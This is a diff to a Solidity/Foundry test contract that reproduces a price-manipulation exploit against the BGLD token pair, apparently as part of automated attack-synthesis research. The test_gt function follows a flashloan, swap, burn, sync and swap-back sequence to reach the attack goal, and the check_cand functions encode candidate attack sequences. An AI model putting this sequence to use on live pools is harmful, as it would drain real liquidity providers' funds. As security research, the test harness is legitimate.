@@ -72,8 +72,6 @@ contract BGLDTest is Test, BlockLoader {
         // Initialize balances and mock flashloan.
         wbnb.transfer(address(pair), balanceOfwbnbpair);
         bgld.transfer(address(pair), balanceOfbgldpair);
-        wbnb.approve(attacker, UINT256_MAX);
-        bgld.approve(attacker, UINT256_MAX);
     }
 
     function printBalance(string memory tips) public {
@@ -138,20 +136,48 @@ contract BGLDTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_wbnb(uint256 amount) internal {
-        wbnb.transferFrom(owner, attacker, amount);
+    function borrow_owner_wbnb(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        wbnb.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_wbnb(uint256 amount) internal {
+    function payback_owner_wbnb(uint256 amount) internal {
         wbnb.transfer(owner, amount);
     }
 
-    function borrow_bgld(uint256 amount) internal {
-        bgld.transferFrom(owner, attacker, amount);
+    function borrow_owner_bgld(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        bgld.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_bgld(uint256 amount) internal {
+    function payback_owner_bgld(uint256 amount) internal {
         bgld.transfer(owner, amount);
+    }
+
+    function borrow_pair_wbnb(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        wbnb.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_wbnb(uint256 amount) internal {
+        wbnb.transfer(address(pair), amount);
+    }
+
+    function borrow_pair_bgld(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        bgld.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_bgld(uint256 amount) internal {
+        bgld.transfer(address(pair), amount);
     }
 
     function swap_pair_bgld_wbnb(uint256 amount) internal {
@@ -188,7 +214,7 @@ contract BGLDTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_wbnb(125e18);
+        borrow_owner_wbnb(125e18);
         printBalance("After step0 ");
         swap_pair_wbnb_bgld(wbnb.balanceOf(attacker));
         printBalance("After step1 ");
@@ -198,7 +224,7 @@ contract BGLDTest is Test, BlockLoader {
         printBalance("After step3 ");
         swap_pair_bgld_wbnb(100 * 1e6);
         printBalance("After step4 ");
-        payback_wbnb((125e18 * 1003) / 1000);
+        payback_owner_wbnb((125e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -213,50 +239,32 @@ contract BGLDTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_bgld(amt1);
         burn_pair_bgld(amt2);
         sync_pair();
         swap_pair_bgld_wbnb(amt3);
-        payback_wbnb(amt4);
+        payback_owner_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
+    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        swap_pair_bgld_wbnb(amt3);
-        payback_wbnb(amt4);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_bgld(amt0);
+        burn_pair_bgld(amt1);
+        payback_owner_bgld(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        swap_pair_bgld_wbnb(amt3);
-        swap_pair_bgld_wbnb(amt4);
-        payback_wbnb(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_bgld(amt0);
+        burn_pair_bgld(amt1);
+        payback_pair_bgld(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -265,37 +273,25 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        sync_pair();
-        swap_pair_bgld_wbnb(amt3);
-        payback_wbnb(amt4);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_bgld(amt0);
+        burn_pair_bgld(amt1);
+        swap_pair_bgld_wbnb(amt2);
+        payback_owner_bgld(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        swap_pair_bgld_wbnb(amt4);
-        payback_wbnb(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_bgld(amt0);
+        burn_pair_bgld(amt1);
+        sync_pair();
+        payback_owner_bgld(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -304,41 +300,25 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        sync_pair();
-        swap_pair_bgld_wbnb(amt3);
-        swap_pair_bgld_wbnb(amt4);
-        payback_wbnb(amt5);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_bgld(amt0);
+        burn_pair_bgld(amt1);
+        swap_pair_bgld_wbnb(amt2);
+        payback_pair_bgld(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
-    ) public {
+    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        swap_pair_bgld_wbnb(amt4);
-        swap_pair_bgld_wbnb(amt5);
-        payback_wbnb(amt6);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_bgld(amt0);
+        burn_pair_bgld(amt1);
+        sync_pair();
+        payback_pair_bgld(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -348,18 +328,15 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_bgld(amt1);
         burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        sync_pair();
-        swap_pair_bgld_wbnb(amt4);
-        payback_wbnb(amt5);
+        swap_pair_bgld_wbnb(amt3);
+        payback_owner_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -369,19 +346,15 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        swap_pair_bgld_wbnb(amt5);
-        payback_wbnb(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_bgld(amt0);
+        burn_pair_bgld(amt1);
+        swap_pair_bgld_wbnb(amt2);
+        swap_pair_bgld_wbnb(amt3);
+        payback_owner_bgld(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -390,21 +363,15 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_bgld(amt0);
+        burn_pair_bgld(amt1);
         sync_pair();
-        swap_pair_bgld_wbnb(amt4);
-        swap_pair_bgld_wbnb(amt5);
-        payback_wbnb(amt6);
+        swap_pair_bgld_wbnb(amt2);
+        payback_owner_bgld(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -414,21 +381,15 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_wbnb(amt0);
         swap_pair_wbnb_bgld(amt1);
         burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        swap_pair_bgld_wbnb(amt5);
-        swap_pair_bgld_wbnb(amt6);
-        payback_wbnb(amt7);
+        swap_pair_bgld_wbnb(amt3);
+        payback_pair_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -438,20 +399,15 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        sync_pair();
-        swap_pair_bgld_wbnb(amt5);
-        payback_wbnb(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_bgld(amt0);
+        burn_pair_bgld(amt1);
+        swap_pair_bgld_wbnb(amt2);
+        swap_pair_bgld_wbnb(amt3);
+        payback_pair_bgld(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -460,22 +416,15 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        burn_pair_bgld(amt5);
-        swap_pair_bgld_wbnb(amt6);
-        payback_wbnb(amt7);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_bgld(amt0);
+        burn_pair_bgld(amt1);
+        sync_pair();
+        swap_pair_bgld_wbnb(amt2);
+        payback_pair_bgld(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -486,21 +435,16 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3,
         uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_bgld(amt1);
         burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        sync_pair();
-        swap_pair_bgld_wbnb(amt5);
-        swap_pair_bgld_wbnb(amt6);
-        payback_wbnb(amt7);
+        swap_pair_bgld_wbnb(amt3);
+        swap_pair_bgld_wbnb(amt4);
+        payback_owner_wbnb(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -510,75 +454,16 @@ contract BGLDTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_wbnb(amt0);
         swap_pair_wbnb_bgld(amt1);
         burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        burn_pair_bgld(amt5);
-        swap_pair_bgld_wbnb(amt6);
-        swap_pair_bgld_wbnb(amt7);
-        payback_wbnb(amt8);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand014(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        burn_pair_bgld(amt5);
         sync_pair();
-        swap_pair_bgld_wbnb(amt6);
-        payback_wbnb(amt7);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand015(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_wbnb(amt0);
-        swap_pair_wbnb_bgld(amt1);
-        burn_pair_bgld(amt2);
-        burn_pair_bgld(amt3);
-        burn_pair_bgld(amt4);
-        burn_pair_bgld(amt5);
-        sync_pair();
-        swap_pair_bgld_wbnb(amt6);
-        swap_pair_bgld_wbnb(amt7);
-        payback_wbnb(amt8);
+        swap_pair_bgld_wbnb(amt3);
+        payback_owner_wbnb(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
